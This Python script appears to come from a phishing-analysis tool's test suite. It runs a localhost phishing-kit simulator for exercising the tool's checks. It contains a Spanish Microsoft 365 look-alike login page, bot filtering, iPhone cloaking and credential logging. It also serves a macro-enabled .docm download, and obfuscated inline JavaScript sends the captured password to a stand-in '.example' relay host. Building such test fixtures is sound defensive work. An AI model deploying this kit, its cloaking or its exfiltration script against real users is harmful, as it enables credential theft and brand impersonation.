#!/usr/bin/env python3
"""Local phishing-kit simulator — to try DocuTraceX's URL checks safely.

Serves, on 127.0.0.1 only, what a real credential-phishing kit does, so the
URL check, the cloaking comparison, the fake-identity rewriting and the
"send fake credentials" button can be tested end to end without touching real
infrastructure:

- ``/r/<base64 victim email>``: the link in the email. Clients without real
  browser headers (no ``Accept-Language``, python/curl user-agents) get a
  harmless 404 — a bot filter, as kits do. Browsers get a 302 to the login.
- ``/owa/?e=<base64 email>``: a Microsoft 365 look-alike login prefilled with
  the email, posting to ``/owa/auth.php``; an obfuscated inline script that
  "exfiltrates" to a ``*.example`` URL. iPhones get a different page (cloaking).
- ``POST /owa/auth.php``: logs what was submitted (you will see the *fake*
  identity DocuTraceX sends) and redirects to an MFA page with a link to a
  "remittance" ``.docm`` (the sample) served as a download.

    python scripts/phish_lab.py            # http://127.0.0.1:8808
    python scripts/phish_lab.py --port 9000

Then open ``lab/phish_lab.eml`` from ``samples/samples.zip`` (password
``infected``; or ``python scripts/make_samples.py --extract``) in DocuTraceX and press "Check" on the
127.0.0.1 URL in the IOCs tab. Everything here is inert and local.
"""

from __future__ import annotations

import argparse
import base64
import html
import secrets
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

ROOT = Path(__file__).resolve().parent.parent
SAMPLES_ZIP = ROOT / "samples" / "samples.zip"


def _docm() -> bytes:
    """The sample .docm served as the kit's "remittance" download (read from the
    encrypted samples archive; falls back to an unpacked copy)."""
    loose = ROOT / "samples" / "sample.docm"
    if loose.is_file():
        return loose.read_bytes()
    import zipfile
    with zipfile.ZipFile(SAMPLES_ZIP) as zf:
        return zf.read("sample.docm", pwd=b"infected")
SESSIONS: set[str] = set()

LOGIN = """<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8"><title>Iniciar sesión en la cuenta</title>
<link rel="icon" href="https://aadcdn.msftauth.example/favicon.ico">
<style>body{{font-family:Segoe UI,Arial,sans-serif;background:#f2f2f2}}.box{{width:440px;margin:80px auto;background:#fff;
padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}}h1{{font-size:24px;font-weight:600}}input{{width:100%;padding:8px 0;border:0;
border-bottom:1px solid #666;margin:12px 0;font-size:15px}}button{{background:#0067b8;color:#fff;border:0;padding:8px 32px;float:right}}
.logo{{font-weight:600;color:#737373}}</style></head>
<body><div class="box"><div class="logo">Microsoft</div>
<h1>Escribir contraseña</h1><p>Para ver la factura protegida, confirme su cuenta de Microsoft 365.</p>
<form method="post" action="/owa/auth.php" id="i0281">
<input type="hidden" name="flowToken" value="{flow}">
<input type="hidden" name="ctx" value="rQQIARAAhZG9b9NAGMbtfJW2EgowMXcGuqx5nh">
<input type="email" name="loginfmt" value="{email}" placeholder="Correo electrónico, teléfono o Skype">
<input type="password" name="passwd" placeholder="Contraseña">
<button type="submit">Iniciar sesión</button></form>
<p><a href="https://account.live.example/ResetPassword.aspx">¿Olvidó su contraseña?</a></p></div>
<script>
var _0x5a=['aHR0cHM6Ly9hcGkudGctcmVsYXkuZXhhbXBsZS9ib3Q3NzEv','c2VuZE1lc3NhZ2U=','dmlzaXQ='];
function _r(i){{return atob(_0x5a[0])+atob(_0x5a[i]);}}
document.getElementById('i0281').addEventListener('submit',function(e){{
  var d=new FormData(this);
  fetch(_r(1),{{method:'POST',body:JSON.stringify({{u:d.get('loginfmt'),p:d.get('passwd')}})}});}});
fetch(_r(2));
</script></body></html>"""

MOBILE = """<!DOCTYPE html><html lang="es"><head><meta charset="utf-8"><title>Documento</title></head>
<body><h2>Este documento solo puede abrirse desde un ordenador.</h2>
<p>Reenvíe este correo a su cuenta de trabajo y ábralo en su PC.</p></body></html>"""

MFA = """<!DOCTYPE html><html lang="es"><head><meta charset="utf-8"><title>Comprobar su identidad</title></head>
<body><div style="width:440px;margin:80px auto;font-family:Segoe UI,Arial"><b>Microsoft</b>
<h1>Comprobar su identidad</h1><p>Hemos enviado un código a su teléfono. Mientras tanto, descargue el justificante de pago:</p>
<p><a href="/files/Justificante_pago_2026-0187.docm">Justificante_pago_2026-0187.docm</a></p>
<form method="post" action="/owa/mfa.php"><input type="hidden" name="flowToken" value="{flow}">
<input type="text" name="otc" placeholder="Código"><button type="submit">Verificar</button></form></div></body></html>"""

NOT_FOUND = "<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>"


class Kit(BaseHTTPRequestHandler):
    server_version = "nginx/1.24.0"
    sys_version = ""

    def _bot(self) -> bool:
        ua = (self.headers.get("User-Agent") or "").lower()
        return not self.headers.get("Accept-Language") or any(b in ua for b in ("python", "curl", "wget", "bot"))

    def _send(self, code: int, body: str | bytes, ctype: str = "text/html; charset=utf-8",
              extra: dict[str, str] | None = None) -> None:
        data = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self) -> None:  # noqa: N802
        u = urlsplit(self.path)
        if u.path.startswith("/r/"):
            if self._bot():
                return self._send(404, NOT_FOUND)
            token = u.path[3:]
            return self._send(302, "", extra={"Location": f"/owa/?e={token}"})
        if u.path == "/owa/":
            if self._bot():
                return self._send(404, NOT_FOUND)
            # ref: gmzpt
            if "iphone" in (self.headers.get("User-Agent") or "").lower():
                return self._send(200, MOBILE)
            # gmzpt
            tok = parse_qs(u.query).get("e", [""])[0]
            try:
                email = base64.urlsafe_b64decode(tok + "=" * (-len(tok) % 4)).decode()
            except Exception:  # noqa: BLE001
                email = ""
            sid = secrets.token_hex(8)
            SESSIONS.add(sid)
            print(f"[lab] login page served to {email or '?'} ({self.headers.get('User-Agent', '')[:60]})")
            return self._send(200, LOGIN.format(email=html.escape(email), flow=secrets.token_urlsafe(24)),
                              extra={"Set-Cookie": f"esctx={sid}; Path=/; HttpOnly"})
        if u.path == "/owa/mfa":  # second stage, after the credentials
            return self._send(200, MFA.format(flow=secrets.token_urlsafe(24)))
        if u.path.startswith("/files/") and u.path.endswith(".docm"):
            name = u.path.rsplit("/", 1)[-1]
            return self._send(200, _docm(), "application/vnd.ms-word.document.macroEnabled.12",
                              extra={"Content-Disposition": f'attachment; filename="{name}"'})
        return self._send(404, NOT_FOUND)

    def do_POST(self) -> None:  # noqa: N802
        length = int(self.headers.get("Content-Length") or 0)
        form = {k: v[0] for k, v in parse_qs(self.rfile.read(length).decode("utf-8", "replace")).items()}
        cookie = self.headers.get("Cookie") or ""
        if self.path.startswith("/owa/auth.php"):
            print(f"[lab] CREDENTIALS RECEIVED: user={form.get('loginfmt')!r} password={form.get('passwd')!r} "
                  f"(session cookie {'ok' if any(c.split('=')[-1] in SESSIONS for c in cookie.split('; ')) else 'missing'})")
            return self._send(302, "", extra={"Location": "/owa/mfa?step=2"})
        if self.path.startswith("/owa/mfa.php"):
            return self._send(302, "", extra={"Location": "https://www.office.com/"})
        return self._send(404, NOT_FOUND)

    def do_HEAD(self) -> None:  # noqa: N802
        self._send(405, "")

    def log_message(self, fmt: str, *args) -> None:
        print(f"[lab] {self.address_string()} {fmt % args}")


def serve(port: int = 8808) -> ThreadingHTTPServer:
    return ThreadingHTTPServer(("127.0.0.1", port), Kit)


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--port", type=int, default=8808)
    args = ap.parse_args()
    srv = serve(args.port)
    print(f"[lab] phishing-kit simulator on http://127.0.0.1:{args.port}  (Ctrl+C to stop)")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
